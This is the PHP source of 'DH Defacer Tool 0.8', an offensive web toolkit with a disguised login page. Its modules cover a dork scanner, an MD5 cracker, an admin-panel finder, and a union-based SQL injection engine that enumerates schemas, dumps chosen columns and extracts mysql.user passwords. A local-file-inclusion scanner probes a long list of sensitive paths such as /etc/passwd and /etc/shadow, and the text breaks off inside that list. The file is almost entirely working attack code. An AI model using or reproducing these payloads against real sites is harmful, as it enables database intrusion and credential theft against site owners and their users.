<?php

// DH Defacer Tool 0.8
// (C) Doddy Hackman 2014

error_reporting(0);

//
$username = "admin";
$password = "21232f297a57a5a743894a0e4a801fc3"; //admin
//

if (isset($_COOKIE['portal'])) {
    $st = base64_decode($_COOKIE['portal']);
    $plit = split("@", $st);
    $user = $plit[0];
    $pass = $plit[1];
    if ($user == $username and $pass == $password) {
        darcolor();
        echo "
<table border=1 style='margin: 0 auto;'><title>DH Defacer Tools 0.8 (C) Doddy Hackman 2014</title><td><br><center><h2><b><a href='" . "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . "'><h2>DH Defacer Tools 0.8</h3></a></h3></b></center><br><br></td><tr><td>";
        if (isset($_GET['bing'])) {
            if (isset($_POST['bingscan'])) {
                echo "
<table border=1>
<td><center><h2><a href=" . "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . "?bing" . ">Console</a></h2></center></td><tr>
<td><textarea cols=110 rows=40 name=code readonly>\n\n";
                scanner_bing($_POST['dork'], $_POST['pages']);
                echo "\n</textarea></td></table>";
            } else {
                echo "
<form action=?bing method=POST>
<center><br><table border=1>
<td><center><h2>Bing Scanner</h2></center></td><tr>
<td><h3><br><center>Enter Dork</center></h3></td><tr>
<td><input type=text size=50 name=dork value=news.php+id></td><tr>
<td><center><h3>Enter Pages</h3></center></td><tr>
<td><input type=text size=50 name=pages value=2></td><tr>
<td><input type=submit size=500 name=bingscan style='height: 25px; width: 378px' value=Scan></td>
</table></center>
</form>
";
            }
        } elseif (isset($_GET['sql'])) {
            if (isset($_POST['scansql'])) {
                echo "
<table border=1>
<td><center><h2><a href=" . "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . "?sql" . ">Console</a></h2></center></td><tr>
<td><textarea cols=110 rows=40 name=code readonly>\n\n";
                sqlscan($_POST['target']);
                echo "\n</textarea></td></table>";
            } elseif (isset($_POST['getables'])) {
                echo "
<table border=1>
<td><center><h2><a href=" . "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . "?sql" . ">Console</a></h2></center></td><tr>
<td><textarea cols=110 rows=40 name=code readonly>\n\n";
                sql_tables($_POST['target']);
                echo "\n</textarea></td></table>";
            } elseif (isset($_POST['getdbs'])) {
                echo "
<table border=1>
<td><center><h2><a href=" . "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . "?sql" . ">Console</a></h2></center></td><tr>
<td><textarea cols=110 rows=40 name=code readonly>\n\n";
                sql_dbs($_POST['target']);
                echo "\n</textarea></td></table>";
            } elseif (isset($_POST['getmysql'])) {
                echo "
<table border=1>
<td><center><h2><a href=" . "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . "?sql" . ">Console</a></h2></center></td><tr>
<td><textarea cols=110 rows=40 name=code readonly>\n\n";
                sql_mysql($_POST['target']);
                echo "\n</textarea></td></table>";
            } elseif (isset($_POST['scancolumns'])) {
                echo "
<table border=1>
<td><center><h2><a href=" . "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . "?sql" . ">Console</a></h2></center></td><tr>
<td><textarea cols=110 rows=40 name=code readonly>\n\n";
                sql_columns($_POST['target'], $_POST['tablesimple']);
                echo "\n</textarea></td></table>";
            } elseif (isset($_POST['scantablesdb'])) {
                echo "
<table border=1>
<td><center><h2><a href=" . "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . "?sql" . ">Console</a></h2></center></td><tr>
<td><textarea cols=110 rows=40 name=code readonly>\n\n";
                sql_db_tables($_POST['target'], $_POST['db']);
                echo "\n</textarea></td></table>";
            } elseif (isset($_POST['scancolumnsdb'])) {
                echo "
<table border=1>
<td><center><h2><a href=" . "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . "?sql" . ">Console</a></h2></center></td><tr>
<td><textarea cols=110 rows=40 name=code readonly>\n\n";
                sql_db_columns($_POST['target'], $_POST['dbname'], $_POST['tabledb']);
                echo "\n</textarea></td></table>";
            } elseif (isset($_POST['dumpernow'])) {
                echo "
<table border=1>
<td><center><h2><a href=" . "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . "?sql" . ">Console</a></h2></center></td><tr>
<td><textarea cols=110 rows=40 name=code readonly>\n\n";
                sql_dumper($_POST['target'], $_POST['dumptable'], $_POST['dumpcol1'], $_POST['dumpcol2']);
                echo "\n</textarea></td></table>";
            } else {
                echo "

<center><br><table border=1>
<td><center><h2>SQLI Scanner</h2></center></td><tr>
<form action=?sql method=POST>
<td><input type=text size=93 name=target value=http://localhost/labs/sql.php?id=></td><tr>
<td><input type=submit name=scansql style='height: 20px; width: 333px' value='Scan'><input type=submit name=getables style='height: 20px; width: 120px' value='Get Tables'><input type=submit name=getdbs style='height: 20px; width: 120px' value='Get Databases'><input type=submit name=getmysql style='height: 20px; width: 120px' value='Get mysql.users'></td></tr>

<td><center><h2>Get Columns</h2></center></td><tr>
<td><input type=text size=93 name=tablesimple value=hackers></td><tr>
<td><input type=submit name=scancolumns style='height: 20px; width: 694px' value='Extract'><tr>

<td><center><h2>Get Tables of DB</h2></center></td><tr>
<td><input type=text size=93 name=db value=hackman></td><tr>
<td><input type=submit name=scantablesdb style='height: 20px; width: 694px' value='Extract'><tr>

<td><center><h2>Get Columns of DB & Table</h2></center></td><tr>
<td>DB : <input type=text size=40 name=dbname value=hackman></td><tr>
<td>Table : <input type=text size=37 name=tabledb value=hackers></td><tr>
<td><input type=submit name=scancolumnsdb style='height: 20px; width: 694px' value='Extract'><tr>

<td><center><h2>Dumper</h2></center></td><tr>
<td>Table : <input type=text size=42 name=dumptable value=hackers></td><tr>
<td>Column 1 : <input type=text size=37 name=dumpcol1 value=usuario></td><tr>
<td>Column 2 : <input type=text size=37 name=dumpcol2 value=password></td><tr>
<td><input type=submit name=dumpernow style='height: 20px; width: 694px' value='Dump'>

</form>

";
            }
        } elseif (isset($_GET['crack'])) {
            if (isset($_POST['crackscan'])) {
                echo "
<table border=1>
<td><center><h2><a href=" . "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . "?crack" . ">Console</a></h2></center></td><tr>
<td><textarea cols=110 rows=40 name=code readonly>\n\n";
                $hashes = trim($_POST['hashes']);
                $hashes = explode("\n", $hashes);
                foreach($hashes as $hash) {
                    crackmd5(trim($hash));
                }
                echo "\n</textarea></td></table>";
            } else {
                echo "
<form action=?crack method=POST>
<center><br><table border=1>
<td><center><h2>MD5 Cracker</h2></center></td><tr>
<td><h3><br><center>Enter Hashes</center></h3></td><tr>
<td>
<textarea cols=50 rows=20 name=hashes>
</textarea>
</td><tr>
<td><input type=submit size=500 name=crackscan style='height: 25px; width: 390px' value=Crack></td>
</table></center>
</form>";
            }
        } elseif (isset($_GET['adminz'])) {
            if (isset($_POST['adminscan'])) {
                echo "
<table border=1>
<td><center><h2><a href=" . "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . "?adminz" . ">Console</a></h2></center></td><tr>
<td><textarea cols=110 rows=40 name=code readonly>\n\n";
                paneladmin($_POST['target']);
                echo "\n</textarea></td></table>";
            } else {
                echo "
<form action=?adminz method=POST>
<center><br><table border=1>
<td><center><h2>Admin Finder</h2></center></td><tr>
<td><h3><br><center>Enter Page</center></h3></td><tr>
<td><input type=text size=50 name=target value=http://localhost/></td><tr>
<td><input type=submit size=500 name=adminscan style='height: 25px; width: 378px' value=Scan></td>
</table></center>
</form>
";
            }
        } elseif (isset($_GET['lfi'])) {
            if (isset($_POST['lfiscan'])) {
                echo "
<table border=1>
<td><center><h2><a href=" . "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . "?lfi" . ">Console</a></h2></center></td><tr>
<td>
<center>
<textarea cols=110 rows=40 name=code readonly>\n\n";
                lfiscan($_POST['target']);
                echo "\n</textarea>
</center>
</td></table>";
            } else {
                echo "
<form action=?lfi method=POST>
<center><br><table border=1>
<td><center><h2>LFI Scan</h2></center></td><tr>
<td><h3><br><center>Enter Page</center></h3></td><tr>
<td><input type=text size=50 name=target value=http://localhost/labs/lfi.php?file=></td><tr>
<td><input type=submit size=500 name=lfiscan style='height: 25px; width: 378px' value=Scan></td>
</table></center>
</form>
";
            }
        } elseif (isset($_GET['locate'])) {
            if (isset($_POST['locatescan'])) {
                echo "
<table border=1>
<td><center><h2><a href=" . "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . "?locate" . ">Console</a></h2></center></td><tr>
<td><textarea cols=110 rows=40 name=code readonly>\n\n";
                locateip($_POST['target']);
                echo "\n</textarea></td></table>";
            } else {
                echo "
<form action=?locate method=POST>
<center><br><table border=1>
<td><center><h2>Locate IP</h2></center></td><tr>
<td><h3><br><center>Enter Page</center></h3></td><tr>
<td><input type=text size=50 name=target value=http://www.petardas.com/index.php></td><tr>
<td><input type=submit size=500 name=locatescan style='height: 25px; width: 378px' value=Scan></td>
</table></center>
</form>
";
            }
        } elseif (isset($_GET['encode'])) {
            if (isset($_POST['encodescan'])) {
                echo "
<table border=1>
<td><center><h2><a href=" . "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . "?encode" . ">Console</a></h2></center></td><tr>
<td><textarea cols=110 rows=40 name=code readonly>\n\n";
                if ($_POST['optionsa'] == "MD5") {
                    echo "\n\t\t\t[+] MD5 : " . md5($_POST['tex']);
                }
                if ($_POST['optionsa'] == "Base64") {
                    echo "\n\t\t\t[+] base64_encode : " . base64_encode($_POST['tex']);
                }
                if ($_POST['optionsa'] == "Hex") {
                    echo "\n\t\t\t[+] Hex : " . hex($_POST['tex']);
                }
                echo "\n</textarea></td></table>";
            } elseif (isset($_POST['decodescan'])) {
                echo "
<table border=1>
<td><center><h2><a href=" . "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . "?encode" . ">Console</a></h2></center></td><tr>
<td><textarea cols=110 rows=40 name=code readonly>\n\n";
                if ($_POST['optionsa'] == "MD5") {
                    echo "\n\t\t\t[+] MD5 : ?";
                }
                if ($_POST['optionsa'] == "Base64") {
                    echo "\n\t\t\t[+] base64_decode : " . base64_decode($_POST['tex']);
                }
                if ($_POST['optionsa'] == "Hex") {
                    echo "\n\t\t\t[+] Hex : " . hexdecode($_POST['tex']);
                }
                echo "\n</textarea></td></table>";
            } else {
                echo "<form action=?encode method=POST>
<center><br><table border=1>
<td><center><h2>Encoders</h2></center></td><tr>
<td>
<b>Text :</b> <input type=text name=tex value=test><select name=optionsa><option>MD5</option><option>Base64</option><option>Hex</option></select><input type=submit name=encodescan value=Encode><input type=submit name=decodescan value=Decode>
</form>
</td>
</table></center>
</form>";
            }
        } else {
            echo "<center><table border=1>
<td><h2><center><br><b>Menu</b></center></h2></td><tr><br><br>
<td width=300><h3><br><center><a href=?bing>Bing Scanner</a></center></h3></td><tr>
<td width=300><h3><br><center><a href=?sql>SQLI Scanner</a></center></h3></td><tr>
<td width=300><h3><br><center><a href=?lfi>LFI Scanner</a></center></h3></td><tr>
<td width=300><h3><br><center><a href=?crack>MD5 Cracker</a></center></h3></td><tr>
<td width=300><h3><br><center><a href=?adminz>Admin Finder</a></center></h3></td><tr>
<td width=300><h3><br><center><a href=?locate>Locate IP</a></center></h3></td><tr>
<td width=300><h3><br><center><a href=?encode>Encoders</a></center></h3></td><tr>
</table><br><br>";
        }
        echo "
</form></td><tr>
<td><center>
<br><center><b><a href='http://doddyhackman.webcindario.com'><b><h2>-- == (C) Doddy Hackman 2014 == --</h2></b></a></b></center><br><br></table>";
    }
} elseif (isset($_GET['admin'])) {
    if (isset($_POST['login'])) {
        if ($_POST['user'] == $username and md5($_POST['password']) == $password) {
            setcookie("portal", base64_encode($_POST['user'] . "@" . md5($_POST['password'])));
            echo "<script>alert('Welcome Idiot');</script>";
            echo '<meta http-equiv="refresh" content=0;URL=?=>';
        } else {
            echo "<script>alert('Fuck You');</script>";
        }
    } else {
        darcolor();
        echo "
<title>Administration</title>
<br><h1><center>Administration</center></h1>
<br><center>
<form action='?admin' method=POST>
Username : <input type=text name=user><br>
Password : <input type=password name=password><br><br>
<input type=submit name=login value=Enter><br>
</form>
</center><br><br>";
    }
} else {
    echo "<meta http-equiv='Refresh' content='0;url=http://www.google.com'>";
}
// Functions
//crackmd5("098f6bcd4621d373cade4e832627b4f6");
//lfiscan("http://localhost:8080/labs/lfi.php?file=");
//sqlscan("http://localhost:8080/labs/sql.php?id=");
//sql_tables("http://localhost:8080/labs/sql.php?id=-1+union+select+hackman,2,3");
//sql_columns("http://localhost:8080/labs/sql.php?id=-1+union+select+hackman,2,3","hackers");
//sql_dbs("http://localhost:8080/labs/sql.php?id=-1+union+select+hackman,2,3");
//sql_db_tables("http://localhost:8080/labs/sql.php?id=-1+union+select+hackman,2,3","hackman");
//sql_db_columns("http://localhost:8080/labs/sql.php?id=-1+union+select+hackman,2,3","hackman","hackers");
//sql_mysql("http://localhost:8080/labs/sql.php?id=-1+union+select+hackman,2,3");
//sql_dumper("http://localhost:8080/labs/sql.php?id=-1+union+select+hackman,2,3","hackers","usuario","password");
function cortar_limpio() {
    echo "</textarea>
</form></td><tr>
<td><center>
<br><center><b><a href='http://doddyhackman.webcindario.com'><b><h2>-- == (C) Doddy Hackman 2014 == --</h2></b></a></b></center><br><br></table>";
}
function sql_dumper($target, $tabla, $columna1, $columna2) {
    echo "\n\t\t\t[+] Fuzzing values ...\n";
    $url1 = $target;
    $url2 = $target;
    $url1 = str_replace("hackman", "unhex(hex(concat(char(69,82,84,79,82,56,53,52),count(" . $columna1 . "),char(69,82,84,79,82,56,53,52))))", $url1);
    $url2 = str_replace("hackman", "unhex(hex(concat(char(69,82,84,79,82,56,53,52)," . $columna1 . ",char(69,82,84,79,82,56,53,52)," . $columna2 . ",char(69,82,84,79,82,56,53,52))))", $url2);
    $code = toma($url1 . "+from+" . $tabla . "--");
    if (preg_match("/ERTOR854(.*)ERTOR854/i", $code)) {
        preg_match_all("/ERTOR854(.*)ERTOR854/i", $code, $re);
        $reco = $re[1][0];
        echo "\n\t\t\t[+] Values Found : " . $reco . "\n";
        for ($i = 0;$i <= $reco;$i++) {
            $code = toma($url2 . "+from+" . $tabla . "+limit+" . $i . ",1--");
            if (preg_match("/ERTOR854(.*)ERTOR854(.*)ERTOR854/i", $code)) {
                preg_match_all("/ERTOR854(.*)ERTOR854(.*)ERTOR854/i", $code, $re);
                echo "\n\t\t\t[+] " . $columna1 . " : " . $re[1][0];
                echo "\n\t\t\t[+] " . $columna2 . " : " . $re[2][0];
            }
        }
    } else {
        echo "\n\t\t\t[-] Not Found";
    }
    echo "\n\n\t\t\t[+] Finished";
}
function sql_mysql($target) {
    echo "\n\t\t\t[+] Fuzzing mysql.user ...\n";
    $url1 = $target;
    $url2 = $target;
    $url1 = str_replace("hackman", "unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(82,65,84,83,88,80,68,79,87,78,49))))", $url1);
    $url2 = str_replace("hackman", "unhex(hex(concat(0x524154535850444f574e,Host,0x524154535850444f574e,User,0x524154535850444f574e,Password,0x524154535850444f574e)))", $url2);
    $code = toma($url1 . "+from+mysql.user--");
    if (preg_match("/RATSXPDOWN1(.*)RATSXPDOWN1/i", $code)) {
        preg_match_all("/RATSXPDOWN1(.*)RATSXPDOWN1/i", $code, $re);
        $reco = $re[1][0];
        echo "\n\t\t\t[+] Values Found : " . $reco . "\n";
        for ($i = 0;$i <= $reco;$i++) {
            $code = toma($url2 . "+from+mysql.user+limit+" . $i . ",1--");
            if (preg_match("/RATSXPDOWN(.*)RATSXPDOWN(.*)RATSXPDOWN(.*)RATSXPDOWN/i", $code)) {
                preg_match_all("/RATSXPDOWN(.*)RATSXPDOWN(.*)RATSXPDOWN(.*)RATSXPDOWN/i", $code, $re);
                echo "\n\t\t\t[+] Host : " . $re[1][0];
                echo "\n\t\t\t[+] Username : " . $re[2][0];
                echo "\n\t\t\t[+] Password : " . $re[3][0];
            }
        }
    } else {
        echo "\n\t\t\t[-] Not Found";
    }
    echo "\n\n\t\t\t[+] Finished";
}
function sql_db_columns($target, $db, $table) {
    echo "\n\t\t\t[+] Fuzzing columns ...\n";
    $url1 = $target;
    $url2 = $target;
    $url1 = str_replace("hackman", "unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(82,65,84,83,88,80,68,79,87,78,49))))", $url1);
    $url2 = str_replace("hackman", "unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),column_name,char(82,65,84,83,88,80,68,79,87,78,49))))", $url2);
    $code = toma($url1 . "+from+information_schema.columns+where+table_name=" . hex($table) . "+and+table_schema=" . hex($db) . "--");
    if (preg_match("/RATSXPDOWN1(.*)RATSXPDOWN1/i", $code)) {
        preg_match_all("/RATSXPDOWN1(.*)RATSXPDOWN1/i", $code, $re);
        $reco = $re[1][0];
        echo "\n\t\t\t[+] Columns Found : " . $reco . "\n";
        for ($i = 0;$i <= $reco;$i++) {
            $code = toma($url2 . "+from+information_schema.columns+where+table_name=" . hex($table) . "+and+table_schema=" . hex($db) . "+limit+" . $i . ",1--");
            if (preg_match("/RATSXPDOWN1(.*)RATSXPDOWN1/i", $code)) {
                preg_match_all("/RATSXPDOWN1(.*)RATSXPDOWN1/i", $code, $re);
                echo "\n\t\t\t[+] Column : " . $re[1][0];
            }
        }
    } else {
        echo "\n\t\t\t[-] Not Found";
    }
    echo "\n\n\t\t\t[+] Finished";
}
function sql_db_tables($target, $db) {
    echo "\n\t\t\t[+] Fuzzing tables ...\n";
    $url1 = $target;
    $url2 = $target;
    $url1 = str_replace("hackman", "unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),table_name,char(82,65,84,83,88,80,68,79,87,78,49))))", $url1);
    $url2 = str_replace("hackman", "unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(82,65,84,83,88,80,68,79,87,78,49))))", $url2);
    $code = toma($url2 . "+from+information_schema.tables+where+table_schema=" . hex($db) . "--");
    if (preg_match("/RATSXPDOWN1(.*)RATSXPDOWN1/i", $code)) {
        preg_match_all("/RATSXPDOWN1(.*)RATSXPDOWN1/i", $code, $re);
        $reco = $re[1][0];
        echo "\n\t\t\t[+] Tables Found : " . $reco . "\n";
        for ($i = 0;$i <= $reco;$i++) {
            $code = toma($url1 . "+from+information_schema.tables+where+table_schema=" . hex($db) . "+limit+" . $i . ",1--");
            if (preg_match("/RATSXPDOWN1(.*)RATSXPDOWN1/i", $code)) {
                preg_match_all("/RATSXPDOWN1(.*)RATSXPDOWN1/i", $code, $re);
                echo "\n\t\t\t[+] Table : " . $re[1][0];
            }
        }
    } else {
        echo "\n\t\t\t[-] Not Found";
    }
    echo "\n\n\t\t\t[+] Finished";
}
function sql_dbs($target) {
    echo "\n\t\t\t[+] Fuzzing DBS ...\n";
    $url1 = $target;
    $url2 = $target;
    $url1 = str_replace("hackman", "unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(82,65,84,83,88,80,68,79,87,78,49))))", $url1);
    $url2 = str_replace("hackman", "unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),schema_name,char(82,65,84,83,88,80,68,79,87,78,49))))", $url2);
    $code = toma($url1 . "+from+information_schema.schemata--");
    if (preg_match("/RATSXPDOWN1(.*)RATSXPDOWN1/i", $code)) {
        preg_match_all("/RATSXPDOWN1(.*)RATSXPDOWN1/i", $code, $re);
        $reco = $re[1][0];
        echo "\n\t\t\t[+] DBS Found : " . $reco . "\n";
        for ($i = 0;$i <= $reco;$i++) {
            $code = toma($url2 . "+from+information_schema.schemata+limit+" . $i . ",1--");
            if (preg_match("/RATSXPDOWN1(.*)RATSXPDOWN1/i", $code)) {
                preg_match_all("/RATSXPDOWN1(.*)RATSXPDOWN1/i", $code, $re);
                echo "\n\t\t\t[+] DB : " . $re[1][0];
            }
        }
    } else {
        echo "\n\t\t\t[-] Not Found";
    }
    echo "\n\n\t\t\t[+] Finished";
}
function sql_columns($target, $table) {
    echo "\n\t\t\t[+] Fuzzing columns ...\n";
    $url1 = $target;
    $url2 = $target;
    $url1 = str_replace("hackman", "unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(82,65,84,83,88,80,68,79,87,78,49))))", $url1);
    $url2 = str_replace("hackman", "unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),column_name,char(82,65,84,83,88,80,68,79,87,78,49))))", $url2);
    $code = toma($url1 . "+from+information_schema.columns+where+table_name=" . hex($table) . "--");
    if (preg_match("/RATSXPDOWN1(.*)RATSXPDOWN1/i", $code)) {
        preg_match_all("/RATSXPDOWN1(.*)RATSXPDOWN1/i", $code, $re);
        $reco = $re[1][0];
        echo "\n\t\t\t[+] Columns Found : " . $reco . "\n";
        for ($i = 0;$i <= $reco;$i++) {
            $code = toma($url2 . "+from+information_schema.columns+where+table_name=" . hex($table) . "+limit+" . $i . ",1--");
            if (preg_match("/RATSXPDOWN1(.*)RATSXPDOWN1/i", $code)) {
                preg_match_all("/RATSXPDOWN1(.*)RATSXPDOWN1/i", $code, $re);
                echo "\n\t\t\t[+] Column : " . $re[1][0];
            }
        }
    } else {
        echo "\n\t\t\t[-] Not Found";
    }
    echo "\n\n\t\t\t[+] Finished";
}
function sql_tables($target) {
    echo "\n\t\t\t[+] Fuzzing tables ...\n";
    $url1 = $target;
    $url2 = $target;
    $url1 = str_replace("hackman", "unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),table_name,char(82,65,84,83,88,80,68,79,87,78,49))))", $url1);
    $url2 = str_replace("hackman", "unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(82,65,84,83,88,80,68,79,87,78,49))))", $url2);
    $code = toma($url2 . "+from+information_schema.tables--");
    if (preg_match("/RATSXPDOWN1(.*)RATSXPDOWN1/i", $code)) {
        preg_match_all("/RATSXPDOWN1(.*)RATSXPDOWN1/i", $code, $re);
        $reco = $re[1][0];
        echo "\n\t\t\t[+] Tables Found : " . $reco . "\n";
        for ($i = 17;$i <= $reco;$i++) {
            $code = toma($url1 . "+from+information_schema.tables+limit+" . $i . ",1--");
            if (preg_match("/RATSXPDOWN1(.*)RATSXPDOWN1/i", $code)) {
                preg_match_all("/RATSXPDOWN1(.*)RATSXPDOWN1/i", $code, $re);
                echo "\n\t\t\t[+] Table : " . $re[1][0];
            }
        }
    } else {
        echo "\n\n\t\t\t[-] Not Found";
    }
    echo "\n\n\t\t\t[+] Finished";
}
function sqlscan($target) {
    echo "\n\t\t\t[+] Scanning ...\n";
    $code = toma($target . "-1+union+select+1--");
    if (preg_match("/The used SELECT statements have a different number of columns/i", $code)) {
        echo "\n\t\t\t[+] Searching count of the columns";
        $sqli = "concat(0x646F6464796861636B6D616E,1,0x646F6464796861636B6D616E)";
        for ($i = 2;$i <= 70;$i++) {
            $sqli.= ",concat(0x646F6464796861636B6D616E,$i,0x646F6464796861636B6D616E)";
            $code = toma($target . "-1+union+select+" . $sqli . "--");
            if (preg_match("/doddyhackman(.*)doddyhackman/i", $code)) {
                $sac = preg_match("/doddyhackman(.*)doddyhackman/i", $code);
                echo "\n\t\t\t[+] Rows Length : $i";
                $sql = "1";
                for ($n = 2;$n <= $i;$n++) {
                    $sql.= ",$n";
                }
                $sqla = str_replace($sac, "hackman", $sql);
                echo "\n\t\t\t[+] SQLI : " . $target . "-1+union+select+" . $sqla . "--";
                echo "\n\t\t\t[+] The number $sac print data";
                $data_sql = "unhex(hex(concat(char(69,82,84,79,82,56,53,52),version(),char(69,82,84,79,82,56,53,52),database(),char(69,82,84,79,82,56,53,52),user(),char(69,82,84,79,82,56,53,52))))";
                $sqlaa = str_replace("hackman", $data_sql, $sqla);
                $code = toma($target . "-1+union+select+" . $sqlaa);
                if (preg_match("/ERTOR854(.*)ERTOR854(.*)ERTOR854(.*)ERTOR854/i", $code)) {
                    preg_match_all("/ERTOR854(.*)ERTOR854(.*)ERTOR854(.*)ERTOR854/i", $code, $re);
                    echo "\n\t\t\t[+] DB Version : " . $re[1][0];
                    echo "\n\t\t\t[+] DB Name : " . $re[2][0];
                    echo "\n\t\t\t[+] DB Username : " . $re[3][0];
                }
                echo "\n\n\t\t\t[+] Finished";
                cortar_limpio();
            }
        }
    }
    echo "\n\t\t\t[-] Not Vulnerable";
}
function lfiscan($target) {
    $files = array('C:/xampp/htdocs/aca.txt', 'C:/xampp/htdocs/aca.txt', 'C:/xampp/htdocs/admin.php', 'C:/xampp/htdocs/leer.txt', '../../../boot.ini', '../../../../boot.ini', '../../../../../boot.ini', '../../../../../../boot.ini', '/etc/passwd', '/etc/shadow', '/etc/shadow~', '/etc/hosts', '/etc/motd', '/etc/apache/apache.conf', '/etc/fstab', '/etc/apache2/apache2.conf', '/etc/apache/httpd.conf', '/etc/httpd/conf/httpd.conf', '/etc/apache2/httpd.conf', '/etc/apache2/sites-available/default', '/etc/mysql/my.cnf', '/etc/my.cnf', '/etc/sysconfig/network-scripts/ifcfg-eth0', '/etc/redhat-release', '/etc/httpd/conf.d/php.conf', '/etc/pam.d/proftpd', '/etc/phpmyadmin/config.inc.php', '/var/www/config.php', '/etc/httpd/logs/error_log', '/etc/httpd/logs/error.log', '/etc/httpd/logs/access_log', '/etc/httpd/logs/access.log', '/var/log/apache/error_log', '/var/log/apache/error.log', '/var/log/apache/access_log', '/var/log/apache/access.log', '/var/log/apache2/error_log', '/var/log/apache2/error.log', '/var/log/apache2/access_log', '/var/log/apache2/access.log', '/var/www/logs/error_log', '/var/www/logs/error.log', '/var/www/logs/access_log', '/var/www/logs/access.log', '/usr/local/apache/logs/error_log', '/usr/local/apache/logs/error.log', '/usr/local/apache/logs/access_log', '/usr/local/apache/logs/access.log', '/var/log/error_log', '/var/log/error.log', '/var/log/access_log', '/var/log/access.log', '/etc/group', '/etc/security/group', '/etc/security/passwd', '/etc/security/user', '/etc/security/environ', '/etc/security/limits', '/usr/lib/security/mkuser.default', '/apache/logs/access.log', '/apache/logs/error.log', '/etc/httpd/logs/acces_log', '/etc/httpd/logs/acces.log', '/var/log/httpd/access_log', '/var/log/httpd/error_log', '/apache2/logs/error.log', '/apache2/logs/access.log', '/logs/error.log', '/logs/access.log', '/usr/local/apache2/logs/access_log', '/usr/local/apache2/logs/access.log', '/usr/local/apache2/logs/error_log', '/usr/local/apache2/logs/error.log', '/var/log/httpd/access.log', '/var/log/httpd/error.log', '/opt/lampp/logs/access_log', '/opt/lampp/logs/error_log', '/opt/xampp/logs/access_log', '/opt/xampp/logs/error_log', '/opt/lampp/logs/access.log', '/opt/lampp/logs/error.log', '/opt/xampp/logs/access.log', '/opt/xampp/logs/error.log', 'C:\ProgramFiles\ApacheGroup\Apache\logs\access.log', 'C:\ProgramFiles\ApacheGroup\Apache\logs\error.log', '/usr/local/apache/conf/httpd.conf', '/usr/local/apache2/conf/httpd.conf', '/etc/apache/conf/httpd.conf', '/usr/local/etc/apache/conf/httpd.conf', '/usr/local/apache/httpd.conf', '/usr/local/apache2/httpd.conf', '/usr/local/httpd/conf/httpd.conf', '/usr/local/etc/apache2/conf/httpd.conf', '/usr/local/etc/httpd/conf/httpd.conf', '/usr/apache2/conf/httpd.conf', '/usr/apache/conf/httpd.conf', '/usr/local/apps/apache2/conf/httpd.conf', '/usr/local/apps/apache/conf/httpd.conf', '/etc/apache2/conf/httpd.conf', '/etc/http/conf/httpd.conf', '/etc/httpd/httpd.conf', '/etc/http/httpd.conf', '/etc/httpd.conf', '/opt/apache/conf/httpd.conf', '/opt/apache2/conf/httpd.conf', '/var/www/conf/httpd.conf', '/private/etc/httpd/httpd.conf', '/private/etc/httpd/httpd.conf.default', '/Volumes/webBackup/opt/apache2/conf/httpd.conf', '/Volumes/webBackup/private/etc/httpd/httpd.conf', '/Volumes/webBackup/private/etc/httpd/httpd.conf.default', 'C:\ProgramFiles\ApacheGroup\Apache\conf\httpd.conf', 'C:\ProgramFiles\ApacheGroup\Apache2\conf\httpd.conf', 'C:\ProgramFiles\xampp\apache\conf\httpd.conf', '/usr/local/php/httpd.conf.php', '/usr/local/php4/httpd.conf.php', '/usr/local/php5/httpd.conf.php', '/usr/local/php/httpd.conf', '/usr/local/php4/httpd.conf', '/usr/local/php5/httpd.conf', '/Volumes/Macintosh_HD1/opt/httpd/conf/httpd.conf', '/Volumes/Macintosh_HD1/opt/apache/conf/httpd.conf', '/Volumes/Macintosh_HD1/opt/apache2/conf/httpd.conf', '/Volumes/Macintosh_HD1/usr/local/php/httpd.conf.php', '/Volumes/Macintosh_HD1/usr/local/php4/httpd.conf.php', '/Volumes/Macintosh_HD1/usr/local/php5/httpd.conf.php', '/usr/local/etc/apache/vhosts.conf', '/etc/php.ini', '/bin/php.ini', '/etc/httpd/php.ini', '/usr/lib/php.ini', '/usr/lib/php/php.ini', '/usr/local/etc/php.ini', '/usr/local/lib/php.ini', '/usr/local/php/lib/php.ini', '/usr/local/php4/lib/php.ini', '/usr/local/php5/lib/php.ini', '/usr/local/apache/conf/php.ini', '/etc/php4.4/fcgi/php.ini', '/etc/php4/apache/php.ini', '/etc/php4/apache2/php.ini', '/etc/php5/apache/php.ini', '/etc/php5/apache2/php.ini', '/etc/php/php.ini', '/etc/php/php4/php.ini', '/etc/php/apache/php.ini', '/etc/php/apache2/php.ini', '/web/conf/php.ini', '/usr/local/Zend/etc/php.ini', '/opt/xampp/etc/php.ini', '/var/local/www/conf/php.ini', '/etc/php/cgi/php.ini', '/etc/php4/cgi/php.ini', '/etc/php5/cgi/php.ini', 'c:\php5\php.ini', 'c:\php4\php.ini', 'c:\php\php.ini', 'c:\PHP\php.ini', 